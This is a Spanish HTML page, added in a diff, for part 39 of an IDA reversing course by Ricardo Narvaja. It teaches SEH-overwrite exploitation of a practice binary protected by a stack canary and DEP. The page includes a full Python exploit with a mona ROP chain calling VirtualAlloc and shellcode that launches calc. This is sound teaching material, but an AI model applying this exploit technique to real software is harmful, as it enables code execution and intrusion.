@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tute 39 · Canary + DEP pisando SEH — Curso IDA</title>
+<meta name="description" content="Tutorial ilustrado del tute 39 del Curso IDA desde cero: Canary + DEP pisando SEH.">
+<link rel="stylesheet" href="../guia/estilo.css">
+</head>
+<body>
+<a class="salto" href="#contenido">Saltar al contenido</a>
+<header class="cabecera">
+  <div class="marca"><a href="../00_EMPEZAR_AQUI.html">CLS · Curso de reversing</a> <span class="edicion">edición 5 · 27/10/2026</span></div>
+  <nav class="principal" aria-label="Navegación principal">
+    <a href="../00_EMPEZAR_AQUI.html">Inicio</a>
+    <a href="../guia/index.html">Curso</a>
+    <a href="../fichas/index.html">Fichas</a>
+    <a href="../glosario.html">Glosario</a>
+    <a href="../preguntas_y_respuestas.html">Repaso</a>
+  </nav>
+</header>
+<main id="contenido">
+<p class="migas"><a href="../ida-tutes.html">← Índice de los 69 tutes de IDA</a></p>
+<h1>Tute 39 · Canary + DEP pisando SEH</h1>
+<p class="meta-tute"><strong>⏱ 5 min de lectura</strong> · 870 palabras · 21 capturas · grupo: Vulnerabilidades y exploiting en user-mode (VLC/CVE, DEP, Mona, canary/SEH, shellcode, heap)</p>
+<aside class="callout nota"><p class="callout-titulo">Qué enseña</p><p>Caso final: stack overflow con canary y DEP por SEH.</p></aside>
+<p><em>▶ video afín (mismo autor, en x64dbg):</em> <a href="../videos.html">«21 Excepciones 2»</a> · <em>se conecta con:</em> <a href="../guia/05-vulnerabilidades.html">Vulnerabilidades (defensivo)</a></p>
+<aside class="callout aviso"><p class="callout-titulo">Material observado, no reescrito</p><p>Es el texto y las capturas del <code>.docx</code> original del curso, solo presentados como tutorial. Puede tener erratas de origen. El autor del curso es Ricardo Narvaja.</p></aside>
+<hr>
+<p>INTRODUCCIÓN AL REVERSING CON IDA PRO DESDE CERO PARTE 39</p>
+<p>CANARY_con_DEP.EXE</p>
+<p>Nos queda como último caso la explotación de un stack overflow con CANARY Y DEP pisando el SEH.</p>
+<figure><img loading="lazy" src="img/39/1.png" alt="Captura 1 del tute 39"></figure>
+<p>Le cambiamos el nombre al ejecutable y atacheamos el IDA a ver qué pasa.</p>
+<figure><img loading="lazy" src="img/39/2.png" alt="Captura 2 del tute 39"></figure>
+<p>Igual que antes crashea cuando se le acaba el stack, veamos los SEH,</p>
+<figure><img loading="lazy" src="img/39/3.png" alt="Captura 3 del tute 39"></figure>
+<p>Igual que antes pisa con el puntero al pop pop ret, pongamos un breakpoint ahí.</p>
+<figure><img loading="lazy" src="img/39/4.png" alt="Captura 4 del tute 39"></figure>
+<p>Apreto F9 y acepto la excepción.</p>
+<figure><img loading="lazy" src="img/39/5.png" alt="Captura 5 del tute 39"></figure>
+<p>Allí estoy como siempre el stack en su tercera posición hay un puntero al NEXT.</p>
+<figure><img loading="lazy" src="img/39/6.png" alt="Captura 6 del tute 39"></figure>
+<p>Si voy ejecutando con F7.</p>
+<figure><img loading="lazy" src="img/39/7.png" alt="Captura 7 del tute 39"></figure>
+<p>Salto al stack ese JMP es el EB 06 90 90 del NEXT, pero cuando lo quiero ejecutar.</p>
+<figure><img loading="lazy" src="img/39/8.png" alt="Captura 8 del tute 39"></figure>
+<p>No se puede ejecutar el stack por el DEP habrá que hacer un ROP.</p>
+<p>El problema es que para hacer un ROP el stack se ha movido y nuestra data no está apuntada por ESP para continuar ROPEANDO, así que en este caso en vez de un POP POP RET necesitamos un gadget que deje el stack acomodado para que cuando ejecute el RET de ese GADGET, tome una dirección mía del stack para poder seguir teniendo el control y continuar ropeando.</p>
+<p>Vimos que en mi caso antes de ejecutar el POP POP RET ESP valía 0xAFEF98</p>
+<figure><img loading="lazy" src="img/39/9.png" alt="Captura 9 del tute 39"></figure>
+<p>Y buscaré la dirección en el stack donde comienza mi data.</p>
+<p>Pongo que busque el immediate value 0x41414141.</p>
+<figure><img loading="lazy" src="img/39/10.png" alt="Captura 10 del tute 39"></figure>
+<p>Vemos que comienza en 0xAFF5A8 podemos sacar la distancia, la data está más abajo de ESP.</p>
+<p>hex(0xAFF5A8 - 0xAFEF98)</p>
+<figure><img loading="lazy" src="img/39/11.png" alt="Captura 11 del tute 39"></figure>
+<p>Así que la distancia entre ESP y el inicio de mi data es 0x610, quiere decir que si busco un gadget</p>
+<pre class='asm'>ADD ESP, XXXX -RET</pre>
+<p>Si XXXX es mayor que 0x610 siempre que no se vaya fuera del stack, moverá ESP adonde está mi data para continuar ropeando.</p>
+<p>Veamos los gadgets de Mypepe.</p>
+<figure><img loading="lazy" src="img/39/12.png" alt="Captura 12 del tute 39"></figure>
+<p>Veo que lo más que le suma a ESP es 0x30 no llega hasta mi fruta.</p>
+<p>Lamentablemente no tiene o al menos yo no encontré ningún gadget, ni siquiera usando la tool Agafi que lo adjunte, para el que lo quiere aprender a usar.</p>
+<p>AGAFI</p>
+<figure><img loading="lazy" src="img/39/13.png" alt="Captura 13 del tute 39"></figure>
+<p>Corro el gisnap con el proceso parado después de manejar la excepción, por ejemplo en el primer POP del POP POP RET, sin ejecutar nada.</p>
+<p>Este gisnap hará un dumpeado del proceso, luego tengo que editar el archivo objective.txt del agafi poniendo cual es la condición que quieres que se dé, en este caso podría ser.</p>
+<p>esp= [esp+0x08]</p>
+<p>Y le podes configurar que solo busque partiendo de cierto ejecutable como en este caso Mypepe.dll.</p>
+<p>Dejo descomentada la condición y el rango que necesito.</p>
+<figure><img loading="lazy" src="img/39/14.png" alt="Captura 14 del tute 39"></figure>
+<p>Después corro el agafi poniendo el nombre del dump que hice antes, que lo guardo en la misma carpeta y el nombre de un txt de salida.</p>
+<p>agafi.exe objective.txt dumped.dmp pepe.txt</p>
+<p>Encontró algunos gadget raros pero el problema.</p>
+<p>----------------------------------------</p>
+<p>[x] Valid gadget at: 7801194e</p>
+<p>--&gt; matchs: esp=[esp+0x8]</p>
+<p>--&gt; stack used: N/A</p>
+<p>--&gt; preserved registers:</p>
+<p>*** 7801194e: clc</p>
+<p>*** 7801194f: popa</p>
+<p>*** 78011950: jl 0x7801195a</p>
+<p>*** 7801195a: pop ebx</p>
+<p>*** 7801195b: leave</p>
+<p>*** 7801195c: ret</p>
+<p>Es que después de ejecutarlo ESP queda apuntando nuevamente justo al SEH y vuelve a saltar al mismo gadget y se rompe en la segunda vez por un valor de EBP 0x41414141 que pasa a ESP en el LEAVE-RET.</p>
+<p>Bueno para poder terminarlo y demostrar cómo se hace, le agregare una instrucción ADD ESP, XXXX -RET al Mypepe.</p>
+<figure><img loading="lazy" src="img/39/15.png" alt="Captura 15 del tute 39"></figure>
+<p>Usaremos ese como gadget para saltar desde el SEH.</p>
+<figure><img loading="lazy" src="img/39/16.png" alt="Captura 16 del tute 39"></figure>
+<p>Probemos saltar ahí cuando crashea, manejando la excepción.</p>
+<figure><img loading="lazy" src="img/39/17.png" alt="Captura 17 del tute 39"></figure>
+<p>Vemos que después de ejecutar el ADD ESP, 700 ya me queda para continuar allí con el ROP y luego el shellcode.</p>
+<p>Vemos la distancia donde debe ir el ROP aquí estoy en ESP=0xeff5c0 y veamos donde empieza mi data.</p>
+<figure><img loading="lazy" src="img/39/18.png" alt="Captura 18 del tute 39"></figure>
+<p>Empieza en 0xeff4d4 puedo hacer la resta y ver la distancia.</p>
+<figure><img loading="lazy" src="img/39/19.png" alt="Captura 19 del tute 39"></figure>
+<p>Armo el script.</p>
+<p>from os import *</p>
+<p>import struct</p>
+<p>def create_rop_chain():</p>
+<p># rop chain generated with mona.py - www.corelan.be</p>
+<p>rop_gadgets = [</p>
+<p>0x7801eb94,  # POP EBP # RETN [Mypepe.dll]</p>
+<p>0x7801eb94,  # skip 4 bytes [Mypepe.dll]</p>
+<p>0x7801ee74,  # POP EBX # RETN [Mypepe.dll]</p>
+<p>0x00000001,  # 0x00000001-&gt; ebx</p>
+<p>0x7802920e,  # POP EDX # RETN [Mypepe.dll]</p>
+<p>0x00001000,  # 0x00001000-&gt; edx</p>
+<p>0x7800a849,  # POP ECX # RETN [Mypepe.dll]</p>
+<p>0x00000040,  # 0x00000040-&gt; ecx</p>
+<p>0x78028756,  # POP EDI # RETN [Mypepe.dll]</p>
+<p>0x7800b281,  # RETN (ROP NOP) [Mypepe.dll]</p>
+<p>0x78001492,  # POP ESI # RETN [Mypepe.dll]</p>
+<p>0x780041ed,  # JMP [EAX] [Mypepe.dll]</p>
+<p>0x78013953,  # POP EAX # RETN [Mypepe.dll]</p>
+<p>0x7802e030,  # ptr to &amp;VirtualAlloc() [IAT Mypepe.dll]</p>
+<p>0x78009791,  # PUSHAD # ADD AL,80 # RETN [Mypepe.dll]</p>
+<p>0x7800f7c1,  # ptr to 'push esp # ret ' [Mypepe.dll]</p>
+<p>]</p>
+<p>return ''.join(struct.pack('&lt;I', _) for _ in rop_gadgets)</p>
+<p>shellcode ="\xB8\x40\x50\x03\x78\xC7\x40\x04"+ "calc" + "\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1\x68\xAB\x39\x00\x78\xC3"</p>
+<p>stdin,stdout = popen4(r'CANARY_con_DEP.exe -1')</p>
+<p>print "ATACHEA EL DEBUGGER Y APRETA ENTER\n"</p>
+<p>raw_input()</p>
+<p>rop= create_rop_chain()</p>
+<p>next="\x41\x41\x41\x41"</p>
+<p>seh=struct.pack("&lt;L", 0x7802d415)</p>
+<p>data=(0xec) * "A" + rop + shellcode</p>
+<p>fruta = data +  ((844-len(data)) * "A" )+ next + seh + 6000 * "A" + "\n"</p>
+<p>print stdin</p>
+<p>print "Escribe: " + fruta</p>
+<p>stdin.write(fruta)</p>
+<p>print stdout.read(40)</p>
+<p>Vemos que use el mismo ROP que antes y le agregue el mismo shellcode para Mypepe y funciono.</p>
+<figure><img loading="lazy" src="img/39/20.png" alt="Captura 20 del tute 39"></figure>
+<p>Vemos que cuando llego al RET el ROP queda en el stack desde el inicio, para continuar ropeando y ejecutando el shellcode.</p>
+<figure><img loading="lazy" src="img/39/21.png" alt="Captura 21 del tute 39"></figure>
+<p>Ahí ejecuto la calculadora.</p>
+<p>Hasta la parte 40</p>
+<p>Ricardo Narvaja</p>
+</main>
+<footer class="pie">
+  <p>Material educativo y defensivo. Las prácticas se limitan a programas propios, software abierto o crackmes diseñados para aprender. No se enseña a eludir licencias, DRM ni controles de acceso.</p>
+  <p><a href="../00_EMPEZAR_AQUI.html">Inicio</a> · <a href="../guia/etapa-0.html">Etapas</a> · <a href="../fuentes_y_limites.html">Fuentes y límites</a> · <a href="../registro_de_cobertura.csv">Registro de cobertura</a></p>
+</footer>
+<script>
+(function(){
+  function abrir(src){
+    var o=document.createElement('div'); o.className='lightbox-ov';
+    var i=document.createElement('img'); i.src=src; o.appendChild(i);
+    function cerrar(){o.remove(); document.removeEventListener('keydown', onkey);}
+    function onkey(e){ if(e.key==='Escape') cerrar(); }
+    o.addEventListener('click', cerrar);
+    document.addEventListener('keydown', onkey);
+    document.body.appendChild(o);
+  }
+  document.addEventListener('DOMContentLoaded', function(){
+    document.querySelectorAll('figure img, main img').forEach(function(img){
+      img.style.cursor='zoom-in';
+      img.addEventListener('click', function(){ abrir(img.currentSrc||img.src); });
+    });
+  });
+})();
+</script>
+</body>
+</html>
